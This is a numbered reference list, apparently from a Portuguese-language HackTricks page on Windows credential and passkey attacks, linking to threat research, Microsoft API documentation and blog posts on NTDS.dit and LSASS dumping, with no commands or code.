- [3] [Check Point Research – Por dentro do Ink Dragon: revelando a rede de retransmissão e o funcionamento interno de uma operação ofensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Passe a passkey: uma nova superfície de ataque na autenticação sem senha](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / armazenamento de chaves CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Como o armazenamento de dados do Active Directory realmente funciona: por dentro do NTDS.dit (Parte 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Despejo remoto de senhas do Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho amplia seu arsenal de ciberespionagem com o toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – função CreateFileW e `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – modo de backup `/B` do Robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Perguntas frequentes do Telegram – encerrar sessões ativas](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
